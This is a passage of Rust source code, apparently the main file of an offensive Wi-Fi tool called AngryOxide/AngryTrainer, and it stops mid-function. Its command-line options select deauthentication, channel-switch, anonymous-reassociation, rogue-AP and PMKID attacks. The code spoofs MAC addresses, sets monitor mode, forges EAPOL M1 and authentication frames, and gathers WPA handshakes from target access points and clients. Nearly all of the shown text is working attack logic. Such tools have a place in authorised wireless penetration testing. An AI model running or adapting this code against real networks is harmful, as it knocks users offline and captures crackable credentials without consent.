mod ascii;
mod attack;
mod auth;
mod devices;
mod pcapng;
mod rawsocks;
mod status;
mod targets;
mod tx;
mod util;

extern crate libc;
extern crate nix;

use anyhow::Result;
use attack::{
    anon_reassociation_attack, csa_attack, deauth_attack, m1_retrieval_attack,
    m1_retrieval_attack_phase_2, rogue_m2_attack_directed, rogue_m2_attack_undirected,
};

use chrono::Local;
use libc::EXIT_FAILURE;
use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkmSuite};
use libwifi::frame::{DataFrame, EapolKey, NullDataFrame};
use nix::unistd::geteuid;

use nl80211_ng::attr::Nl80211Iftype;
use nl80211_ng::channels::{map_str_to_band_and_channel, WiFiBand, WiFiChannel};
use nl80211_ng::{get_interface_info_idx, set_interface_chan, Interface, Nl80211};

use flate2::write::GzEncoder;
use flate2::Compression;

use pcapng::{FrameData, PcapWriter};
use radiotap::field::{AntennaSignal, Field};
use radiotap::Radiotap;
use rand::{thread_rng, Rng};
use rawsocks::{open_socket_rx, open_socket_tx};
use tar::Builder;
use targets::{Target, TargetList, TargetMAC, TargetSSID};
use tx::{
    build_association_response, build_authentication_response, build_disassocation_from_client,
    build_eapol_m1, build_probe_request_target, build_probe_request_undirected,
};
use uuid::Uuid;

use crate::ascii::get_art;
use crate::auth::HandshakeStorage;
use crate::devices::{APFlags, AccessPoint, Station, WiFiDeviceList};
use crate::status::*;

use libwifi::{Addresses, Frame};

use std::collections::{BTreeMap, HashMap};
use std::fs::{self, File};
use std::io::Write;
use std::io::{self};
use std::os::fd::{AsRawFd, OwnedFd};
use std::process::exit;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime};

use clap::Parser;

#[derive(Parser)]
#[command(name = "AngryTrainer")]
#[command(author = "Ryan Butler (Ragnt)")]
#[command(about = "Does awesome things... with wifi.", long_about = None)]
#[command(version)]
struct Arguments {
    #[arg(short, long)]
    /// Interface to use.
    interface: String,

    #[arg(short, long)]
    /// Channel to scan.
    channel: Option<String>,

    #[arg(short, long)]
    /// Target (MAC or SSID) to attack.
    target: String,

    #[arg(short, long)]
    /// Optional - Output filename.
    output: Option<String>,

    #[arg(short, long)]
    /// Optional - Tx MAC for rogue-based attacks - will randomize if excluded.
    mac: Option<String>,

    // Attacks //
    #[arg(long, conflicts_with_all(vec!["csa", "anon_reassoc", "rogue", "pmkid", "deauth_client"]))]
    /// Attack - Send a deauth to broadcast.
    deauth_all: bool,

    #[arg(long, conflicts_with_all(vec!["csa", "anon_reassoc", "rogue", "pmkid", "deauth_all"]))]
    /// Attack - Send a deauth to a client MAC.
    deauth_client: Option<String>,

    #[arg(long, conflicts_with_all(vec!["deauth_all", "anon_reassoc", "rogue", "pmkid", "deauth_client"]))]
    /// Attack - Tx MAC for rogue-based attacks - will randomize if excluded.
    csa: bool,

    #[arg(long, conflicts_with_all(vec!["csa", "deauth_all", "rogue", "pmkid", "deauth_client"]))]
    /// Attack - Send an Anonymous Reassociation attack to target
    anon_reassoc: bool,

    #[arg(long, conflicts_with_all(vec!["csa", "anon_reassoc", "deauth_all", "pmkid", "deauth_client"]))]
    /// Attack - Attack a station that is probing for this target (MUST BE SSID)
    rogue: bool,

    #[arg(long, conflicts_with_all(vec!["csa", "anon_reassoc", "deauth_all", "rogue", "deauth_client"]))]
    /// Attack - Attempt to retrieve PMKID (if available) from access point.
    pmkid: bool,
}

#[derive(Default)]
pub struct Counters {
    pub frame_count: u64,
    pub eapol_count: u64,
    pub error_count: u64,
    pub packet_id: u64,
    pub empty_reads: u64,
    pub empty_reads_rate: u64,
    pub seq1: u16,
    pub seq2: u16,
    pub seq3: u16,
    pub seq4: u16,
    pub prespidx: u8,
    pub beacons: usize,
    pub data: usize,
    pub null_data: usize,
    pub probe_requests: usize,
    pub probe_responses: usize,
    pub control_frames: usize,
    pub authentication: usize,
    pub deauthentication: usize,
    pub association: usize,
    pub reassociation: usize,
}

impl Counters {
    pub fn packet_id(&mut self) -> u64 {
        self.packet_id += 1;
        self.packet_id
    }

    pub fn sequence1(&mut self) -> u16 {
        self.seq1 = if self.seq1 >= 4096 { 1 } else { self.seq1 + 1 };
        self.seq1
    }

    pub fn sequence2(&mut self) -> u16 {
        self.seq2 = if self.seq2 >= 4096 { 1 } else { self.seq2 + 1 };
        self.seq2
    }

    pub fn sequence3(&mut self) -> u16 {
        self.seq3 = if self.seq3 >= 4096 { 1 } else { self.seq3 + 1 };
        self.seq3
    }

    pub fn sequence4(&mut self) -> u16 {
        self.seq4 = if self.seq4 >= 4096 { 1 } else { self.seq4 + 1 };
        self.seq4
    }

    pub fn proberesponseindex(&mut self) -> u8 {
        self.prespidx = if self.prespidx >= 10 {
            0
        } else {
            self.prespidx + 1
        };
        self.prespidx
    }
}

pub struct RawSockets {
    rx_socket: OwnedFd,
    tx_socket: OwnedFd,
}

pub struct IfHardware {
    netlink: Nl80211,
    original_address: MacAddress,
    current_channel: WiFiChannel,
    hop_channels: Vec<(u8, u8)>,
    hop_interval: Duration,
    interface: Interface,
    interface_uuid: Uuid,
}

pub struct TargetData {
    targets: TargetList,
    rogue_client: MacAddress,
    rogue_m1: EapolKey,
    rogue_essids: HashMap<MacAddress, String>,
}

pub struct FileData {
    file_prefix: String,
    current_pcap: PcapWriter,
    output_files: Vec<String>,
}
#[derive(Eq, PartialEq)]
pub enum AttackType {
    Deauthentication,
    ChannelSwitch,
    AnonReassociation,
    RogueM2,
    PMKID,
    None,
}

pub struct OxideRuntime {
    counters: Counters,
    access_points: WiFiDeviceList<AccessPoint>,
    unassoc_clients: WiFiDeviceList<Station>,
    handshake_storage: HandshakeStorage,
    status_log: status::MessageLog,
    raw_sockets: RawSockets,
    file_data: FileData,
    target_data: TargetData,
    if_hardware: IfHardware,
    attack_type: AttackType,
    deauth_target: Option<MacAddress>,
}

impl OxideRuntime {
    fn new(cli_args: &Arguments) -> Self {
        println!("Starting AngryOxide... 😈");

        let rogue = cli_args.mac.clone();
        let interface_name = cli_args.interface.clone();

        let mut deauth_target = None;

        let attack_type = if cli_args.deauth_all {
            AttackType::Deauthentication
        } else if let Some(client) = &cli_args.deauth_client {
            if let Ok(mac) = MacAddress::from_str(client) {
                deauth_target = Some(mac);
            }
            AttackType::Deauthentication
        } else if cli_args.csa {
            AttackType::ChannelSwitch
        } else if cli_args.anon_reassoc {
            AttackType::AnonReassociation
        } else if cli_args.rogue {
            AttackType::RogueM2
        } else if cli_args.pmkid {
            AttackType::PMKID
        } else {
            println!("** NO ATTACK SELECTED **");
            AttackType::None
        };

        // Setup initial lists / logs
        let access_points = WiFiDeviceList::new();
        let unassoc_clients = WiFiDeviceList::new();
        let handshake_storage = HandshakeStorage::new();
        let mut log = status::MessageLog::new();

        // Get + Setup Interface

        let mut netlink = Nl80211::new().expect("Cannot open Nl80211");

        let iface = if let Some(interface) = netlink
            .get_interfaces()
            .iter()
            .find(|&(_, iface)| iface.name_as_string() == interface_name)
            .map(|(_, iface)| iface.clone())
        {
            interface
        } else {
            println!("{}", get_art("Interface not found"));
            exit(EXIT_FAILURE);
        };

        let original_address = MacAddress::from_vec(iface.clone().mac.unwrap()).unwrap();

        let idx = iface.index.unwrap();
        let interface_uuid = Uuid::new_v4();
        println!("💲 Interface Summary:");
        println!("{}", iface.pretty_print());

        // Setup target

        let targs = match MacAddress::from_str(&cli_args.target) {
            Ok(mac) => vec![Target::MAC(TargetMAC::new(mac))],
            Err(_) => vec![Target::SSID(TargetSSID::new(&cli_args.target))],
        };

        let targ_list: TargetList = TargetList::from_vec(targs);

        /////////////////////////////////////////////////////////////////////

        //// Setup Channels ////

        let mut iface_bands: BTreeMap<u8, Vec<u8>> = iface
            .get_frequency_list_simple()
            .unwrap()
            .into_iter()
            .collect();
        for (_key, value) in iface_bands.iter_mut() {
            value.sort(); // This sorts each vector in place
        }

        let mut hop_channels: Vec<(u8, u8)> = Vec::new();
        let hop_interval: Duration = Duration::from_secs(2);

        let mut default_chans = false;

        if let Some(chan) = &cli_args.channel {
            if let Some((band, channel)) = map_str_to_band_and_channel(chan) {
                let band_u8 = band.to_u8();
                if !hop_channels.contains(&(band_u8, channel)) {
                    if iface_bands.get(&band_u8).unwrap().contains(&channel) {
                        hop_channels.push((band_u8, channel));
                    } else {
                        println!(
                            "WARNING: Channel {} not available for interface {}... ignoring.",
                            channel,
                            iface.name_as_string()
                        );
                    }
                }
            }
        } else {
            hop_channels.extend(vec![(2u8, 1u8), (2u8, 6u8), (2u8, 11u8)]);
            default_chans = true;
        }

        // Exit if we tried to provide channels but nothing made it to the hopper.
        if !default_chans && hop_channels.is_empty() {
            println!(
                "{}",
                get_art(&format!(
                    "No channels provided are supported by {}",
                    iface.name_as_string()
                ))
            );
            exit(EXIT_FAILURE);
        }

        // Organize channels by band
        let mut channels_by_band: HashMap<u8, Vec<u8>> = HashMap::new();
        for (band, channel) in hop_channels.clone() {
            channels_by_band.entry(band).or_default().push(channel);
        }

        // Sort channels within each band
        for channels in channels_by_band.values_mut() {
            channels.sort();
        }

        // Print channels by band
        println!();
        println!("======== Hop Channels ========");
        for (index, (band, channels)) in channels_by_band.iter().enumerate() {
            let band_tree = if index == channels_by_band.len() - 1 {
                "└"
            } else {
                "├"
            };
            println!(" {} Band {} Channels:", band_tree, band,);
            for (idx, channel) in channels.iter().enumerate() {
                let chan_b_tree = if index == channels_by_band.len() - 1 {
                    " "
                } else {
                    "│"
                };
                let chan_tree = if idx == channels.len() - 1 {
                    "└"
                } else {
                    "├"
                };
                println!(" {} {} {}", chan_b_tree, chan_tree, channel)
            }
        }
        println!("==============================");
        println!();

        ///////////////////////////////

        if let Some(ref phy) = iface.phy {
            if !phy.iftypes.clone().is_some_and(|types| {
                types.contains(&nl80211_ng::attr::Nl80211Iftype::IftypeMonitor)
            }) {
                println!(
                    "{}",
                    get_art("Monitor Mode not available for this interface.")
                );
                exit(EXIT_FAILURE);
            }
        }

        // Put interface into the right mode
        thread::sleep(Duration::from_secs(1));
        println!("💲 Setting {} down.", interface_name);
        netlink.set_interface_down(idx).ok();
        thread::sleep(Duration::from_millis(500));

        // Setup Rogue Mac's
        let mut rogue_client = MacAddress::random();

        if let Some(rogue) = rogue {
            if let Ok(mac) = MacAddress::from_str(&rogue) {
                println!("💲 Setting {} mac to {} (from rogue)", interface_name, mac);
                rogue_client = mac;
            } else {
                println!(
                    "Invalid rogue supplied - randomizing {} mac to {}",
                    interface_name, rogue_client
                );
            }
        } else {
            println!("💲 Randomizing {} mac to {}", interface_name, rogue_client);
        }
        netlink.set_interface_mac(idx, &rogue_client.0).ok();

        // Put into monitor mode
        thread::sleep(Duration::from_millis(500));
        println!(
            "💲 Setting {} to monitor mode. (\"active\" flag: {})",
            interface_name,
            iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x)
        );
        netlink
            .set_interface_monitor(
                iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x),
                idx,
            )
            .ok();

        if let Some(ref phy) = iface.phy {
            if phy.current_iftype.clone().is_some()
                && phy.current_iftype.unwrap() != Nl80211Iftype::IftypeMonitor
            {
                println!("{}", get_art("Interface did not go into Monitor mode"));
                exit(EXIT_FAILURE);
            }
        }

        // Set interface up
        thread::sleep(Duration::from_millis(500));
        println!("💲 Setting {} up.", interface_name);
        netlink.set_interface_up(idx).ok();

        // Open sockets
        let rx_socket = open_socket_rx(idx).expect("Failed to open RX Socket.");
        let tx_socket = open_socket_tx(idx).expect("Failed to open TX Socket.");
        thread::sleep(Duration::from_millis(500));

        println!(
            "💲 Sockets Opened Rx: {} Tx: {}",
            rx_socket.as_raw_fd(),
            tx_socket.as_raw_fd()
        );

        // Setup RogueM1 Data
        let mut rng = thread_rng();
        let key_nonce: [u8; 32] = rng.gen();

        let rogue_m1 = EapolKey {
            protocol_version: 2u8,
            timestamp: SystemTime::now(),
            packet_type: 3u8,
            packet_length: 0u16,
            descriptor_type: 2u8,
            key_information: 138u16,
            key_length: 16u16,
            replay_counter: 1u64,
            key_nonce,
            key_iv: [0u8; 16],
            key_rsc: 0u64,
            key_id: 0u64,
            key_mic: [0u8; 16],
            key_data_length: 0u16,
            key_data: Vec::new(),
        };

        // Setup Filename Prefix
        let file_prefix = if let Some(fname) = cli_args.output.clone() {
            fname.to_string()
        } else {
            "oxide".to_string()
        };

        let now: chrono::prelude::DateTime<Local> = Local::now();
        let date_time = now.format("-%Y-%m-%d_%H-%M-%S").to_string();
        let pcap_filename = format!("{}{}.pcapng", file_prefix, date_time);
        let mut pcap_file = PcapWriter::new(&iface, &pcap_filename);
        pcap_file.start();

        let file_data: FileData = FileData {
            file_prefix,
            current_pcap: pcap_file,
            output_files: vec![pcap_filename],
        };

        // Setup Rogue_ESSID's tracker
        let rogue_essids: HashMap<MacAddress, String> = HashMap::new();

        println!("🎩 KICKING UP THE 4D3D3D3 🎩");
        println!();
        println!("======================================================================");
        println!();
        thread::sleep(Duration::from_secs(2));

        let raw_sockets = RawSockets {
            rx_socket,
            tx_socket,
        };

        let if_hardware = IfHardware {
            netlink,
            original_address,
            current_channel: WiFiChannel::Channel2GHz(1),
            hop_channels,
            hop_interval,
            interface: iface,
            interface_uuid,
        };

        let target_data: TargetData = TargetData {
            targets: targ_list,
            rogue_client,
            rogue_m1,
            rogue_essids,
        };

        OxideRuntime {
            raw_sockets,
            handshake_storage,
            access_points,
            unassoc_clients,
            if_hardware,
            target_data,
            file_data,
            counters: Counters::default(),
            status_log: log,
            attack_type,
            deauth_target,
        }
    }

    pub fn get_adjacent_channel(&self) -> Option<u8> {
        let band_channels = self
            .if_hardware
            .interface
            .get_frequency_list_simple()
            .unwrap();
        let current_channel = self.if_hardware.current_channel.get_channel_number();
        let mut band: u8 = 0;

        // Get our band
        for (hashband, channels) in band_channels.clone() {
            if channels.contains(&current_channel) {
                band = hashband;
            }
        }

        if band == 0 {
            return None;
        }

        // Get the adjacent channel
        if let Some(channels) = band_channels.get(&band) {
            let mut closest_distance = u8::MAX;
            let mut closest_channel = None;

            for &channel in channels {
                let distance = if channel > current_channel {
                    channel - current_channel
                } else {
                    current_channel - channel
                };

                if distance < closest_distance && distance != 0 {
                    closest_distance = distance;
                    closest_channel = Some(channel);
                }
            }

            closest_channel
        } else {
            None
        }
    }

    fn get_target_success(&mut self) -> bool {
        // If there are no targets always return false (not complete)
        if self.target_data.targets.empty() {
            return false;
        }

        let mut all_completes: Vec<bool> = Vec::new();

        for target in self.target_data.targets.get_ref() {
            match target {
                Target::MAC(tgt) => {
                    if self
                        .handshake_storage
                        .has_complete_handshake_for_ap(&tgt.addr)
                    {
                        all_completes.push(true);
                    } else {
                        all_completes.push(false);
                    }
                }
                Target::SSID(tgt) => {
                    if let Some(ap) = self.access_points.get_device_by_ssid(&tgt.ssid) {
                        if self
                            .handshake_storage
                            .has_complete_handshake_for_ap(&ap.mac_address)
                        {
                            all_completes.push(true);
                        } else {
                            all_completes.push(false);
                        }
                    }
                }
            }
        }
        !all_completes.contains(&false)
    }
}

fn process_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
    let radiotap = match Radiotap::from_bytes(packet) {
        Ok(radiotap) => radiotap,
        Err(error) => {
            oxide.counters.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Couldn't read packet data with Radiotap: {error:?}",),
            ));
            return Err(error.to_string());
        }
    };

    oxide.counters.frame_count += 1;
    let packet_id = oxide.counters.packet_id();

    // Get Channel Values
    let current_channel: WiFiChannel = oxide
        .if_hardware
        .interface
        .frequency
        .clone()
        .unwrap()
        .channel
        .unwrap();
    oxide.if_hardware.current_channel = current_channel.clone();
    let band: WiFiBand = current_channel.get_band();
    let channel_u8: u8 = current_channel.get_channel_number();

    let payload = &packet[radiotap.header.length..];

    let fcs = radiotap.flags.map_or(false, |flags| flags.fcs);
    let source: MacAddress;
    let destination: MacAddress;

    // Send a probe request out there every 200 beacons.
    if oxide.counters.beacons % 200 == 0 {
        let frx = build_probe_request_undirected(
            &oxide.target_data.rogue_client,
            oxide.counters.sequence2(),
        );
        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
    }

    match libwifi::parse_frame(payload, fcs) {
        Ok(frame) => {
            source = *frame.src().unwrap_or(&MacAddress([0, 0, 0, 0, 0, 0]));
            destination = *frame.dest();
            let mut beacon_count = 999;

            // Pre Processing
            match frame.clone() {
                Frame::Beacon(beacon_frame) => {
                    oxide.counters.beacons += 1;
                    let bssid = beacon_frame.header.address_3;
                    let signal_strength: AntennaSignal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let station_info = &beacon_frame.station_info;
                    let ssid = station_info
                        .ssid
                        .as_ref()
                        .map(|nssid| nssid.replace('\0', ""));

                    if bssid.is_real_device() && bssid != oxide.target_data.rogue_client {
                        let ap =
                            oxide.access_points.add_or_update_device(
                                bssid,
                                &AccessPoint::new(
                                    bssid,
                                    signal_strength,
                                    ssid.clone(),
                                    Some((
                                        band.clone(),
                                        station_info.ds_parameter_set.unwrap_or(channel_u8), // TRY to use the broadcasted channel number
                                    )),
                                    Some(APFlags {
                                        apie_essid: station_info.ssid.as_ref().map(|_| true),
                                        gs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::CCMP
                                        }),
                                        gs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::TKIP
                                        }),
                                        cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::CCMP)
                                        }),
                                        cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::TKIP)
                                        }),
                                        rsn_akm_psk: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                        rsn_akm_psk256: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256),
                                        ),
                                        rsn_akm_pskft: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT),
                                        ),
                                        wpa_akm_psk: station_info
                                            .wpa_info
                                            .as_ref()
                                            .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                        ap_mfp: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.mfp_required),
                                    }),
                                    oxide.target_data.rogue_client,
                                ),
                            );

                        // Proliferate the SSID / MAC to targets (if this is a target)
                        // Also handle adding the target channel to autohunt params.
                        let _ = oxide.target_data.targets.get_targets(ap);

                        // No SSID, send a probe request. This is low-key so don't increment interactions for this AP.
                        if !ap.ssid.clone().is_some_and(|ssid| !ssid.is_empty())
                            && ap.beacon_count % 200 == 0
                        {
                            let frx = build_probe_request_target(
                                &oxide.target_data.rogue_client,
                                &bssid,
                                oxide.counters.sequence2(),
                            );
                            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
                            oxide.status_log.add_message(StatusMessage::new(
                                MessageType::Info,
                                format!("Hidden SSID Collect: {}", bssid),
                            ));
                        }
                        beacon_count = ap.beacon_count;
                    }

                    // Always try M1 Retrieval
                    // it is running it's own internal rate limiting.
                    if oxide.attack_type == AttackType::PMKID {
                        let _ = m1_retrieval_attack(oxide, &bssid);
                    }

                    if (beacon_count % 8) == 0 {
                        if oxide.attack_type == AttackType::Deauthentication {
                            deauth_attack(oxide, &bssid)?;
                        } else if oxide.attack_type == AttackType::AnonReassociation {
                            anon_reassociation_attack(oxide, &bssid)?;
                        } else if oxide.attack_type == AttackType::ChannelSwitch {
                            csa_attack(oxide, beacon_frame)?;
                        }
                    }

                    // Increase beacon count (now that the attacks are over)
                    if let Some(ap) = oxide.access_points.get_device(&bssid) {
                        ap.beacon_count += 1;
                    }
                }
                Frame::ProbeRequest(probe_request_frame) => {
                    oxide.counters.probe_requests += 1;

                    let client_mac = probe_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = probe_request_frame.header.address_1; // MAC address of the client
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let ssid = &probe_request_frame.station_info.ssid;

                    if client_mac.is_real_device() && client_mac != oxide.target_data.rogue_client {
                        if !ap_mac.is_broadcast() {
                            // Directed probe request
                            match ssid {
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                        ),
                                    );
                                }
                                None => {}
                            }
                            // Probe request attack - Begin our RogueM2 attack procedure.
                            if oxide.attack_type == AttackType::RogueM2 {
                                rogue_m2_attack_directed(oxide, probe_request_frame)?;
                            }
                        } else {
                            // undirected probe request

                            match ssid {
                                None => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![],
                                        ),
                                    );
                                }
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                        ),
                                    );
                                }
                            }

                            // Probe request attack - Begin our RogueM2 attack procedure.
                            if oxide.attack_type == AttackType::RogueM2 {
                                rogue_m2_attack_undirected(oxide, probe_request_frame)?;
                            }
                        }
                    }
                }
                Frame::ProbeResponse(probe_response_frame) => {
                    // Assumption:
                    //  Only an AP will send a probe response.
                    //
                    oxide.counters.probe_responses += 1;
                    let bssid = &probe_response_frame.header.address_3;
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    if bssid.is_real_device() && *bssid != oxide.target_data.rogue_client {
                        let station_info = &probe_response_frame.station_info;
                        let ssid = station_info
                            .ssid
                            .as_ref()
                            .map(|nssid| nssid.replace('\0', ""));
                        let ap =
                            oxide.access_points.add_or_update_device(
                                *bssid,
                                &AccessPoint::new(
                                    *bssid,
                                    signal_strength,
                                    ssid,
                                    Some((band.clone(), channel_u8)),
                                    Some(APFlags {
                                        apie_essid: station_info.ssid.as_ref().map(|_| true),
                                        gs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::CCMP
                                        }),
                                        gs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::TKIP
                                        }),
                                        cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::CCMP)
                                        }),
                                        cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::TKIP)
                                        }),
                                        rsn_akm_psk: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                        rsn_akm_psk256: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256),
                                        ),
                                        rsn_akm_pskft: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT),
                                        ),
                                        wpa_akm_psk: station_info
                                            .wpa_info
                                            .as_ref()
                                            .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                        ap_mfp: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.mfp_required),
                                    }),
                                    oxide.target_data.rogue_client,
                                ),
                            );

                        let targets = oxide.target_data.targets.get_targets(ap);

                        if oxide.attack_type == AttackType::PMKID {
                            let _ = m1_retrieval_attack(oxide, bssid);
                        }
                    };
                }
                Frame::Authentication(auth_frame) => {
                    oxide.counters.authentication += 1;

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if auth_frame.auth_algorithm == 0 {
                        // Open system (Which can be open or WPA2)
                        if auth_frame.auth_seq == 1 {
                            // From Client
                            let client = auth_frame.header.address_2;
                            let ap_addr = auth_frame.header.address_1;

                            // First let's add it to our unassociated clients list:
                            let station = oxide.unassoc_clients.add_or_update_device(
                                client,
                                &Station::new_unassoc_station(client, signal, vec![]),
                            );

                            if ap_addr == oxide.target_data.rogue_client {
                                // We need to send an auth back
                                let frx = build_authentication_response(
                                    &client,
                                    &ap_addr,
                                    &ap_addr,
                                    oxide.counters.sequence3(),
                                );
                                write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
                                station.interactions += 1;
                            }
                        } else if auth_frame.auth_seq == 2 {
                            //// From AP
                            let client = auth_frame.header.address_1;
                            let ap_addr = auth_frame.header.address_2;

                            // Add AP
                            oxide.access_points.add_or_update_device(
                                ap_addr,
                                &AccessPoint::new(
                                    ap_addr,
                                    signal,
                                    None,
                                    Some((band, channel_u8)),
                                    None,
                                    oxide.target_data.rogue_client,
                                ),
                            );

                            if client != oxide.target_data.rogue_client {
                                // If it's not our rogue client that it's responding to.
                                oxide.unassoc_clients.add_or_update_device(
                                    client,
                                    &Station::new_unassoc_station(
                                        client,
                                        AntennaSignal::from_bytes(&[0u8])
                                            .map_err(|err| err.to_string())?,
                                        vec![],
                                    ),
                                );
                            } else {
                                let _ = m1_retrieval_attack_phase_2(
                                    &ap_addr,
                                    &oxide.target_data.rogue_client.clone(),
                                    oxide,
                                );
                            }
                        }
                    }
                }
                Frame::Deauthentication(deauth_frame) => {
                    oxide.counters.deauthentication += 1;

                    // Assumption:
                    //  Deauthentication packets can be sent by the AP or Client.
                    //
                    let from_ds: bool = deauth_frame.header.frame_control.from_ds();
                    let to_ds: bool = deauth_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        deauth_frame.header.address_2
                    } else if !from_ds && to_ds {
                        deauth_frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        deauth_frame.header.address_2
                    } else {
                        deauth_frame.header.address_1
                    };

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    // Add AP
                    if ap_addr.is_real_device() {
                        oxide.access_points.add_or_update_device(
                            ap_addr,
                            &AccessPoint::new(
                                ap_addr,
                                if from_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                None,
                                None,
                                None,
                                oxide.target_data.rogue_client,
                            ),
                        );
                    }

                    // If client sends deauth... we should probably treat as unassoc?
                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        oxide.unassoc_clients.add_or_update_device(
                            station_addr,
                            &Station::new_unassoc_station(
                                station_addr,
                                if to_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                vec![],
                            ),
                        );
                    }
                }
                Frame::Action(frame) => {
                    let from_ds: bool = frame.header.frame_control.from_ds();
                    let to_ds: bool = frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        frame.header.address_2
                    } else if !from_ds && to_ds {
                        frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        frame.header.address_2
                    } else {
                        frame.header.address_1
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or rogue

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some((band, channel_u8)),
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::AssociationRequest(assoc_request_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a client/potential client will ever submit an association request.
                    //  This is how we will know to send a fake M1 and try to get an M2 from it.

                    let client_mac = assoc_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = assoc_request_frame.header.address_1; // MAC address of the AP.
                    let ssid = assoc_request_frame.station_info.ssid;

                    // Handle client as not yet associated
                    if client_mac.is_real_device() && client_mac != oxide.target_data.rogue_client {
                        let station = oxide.unassoc_clients.add_or_update_device(
                            client_mac,
                            &Station::new_unassoc_station(
                                client_mac,
                                radiotap.antenna_signal.unwrap_or(
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?,
                                ),
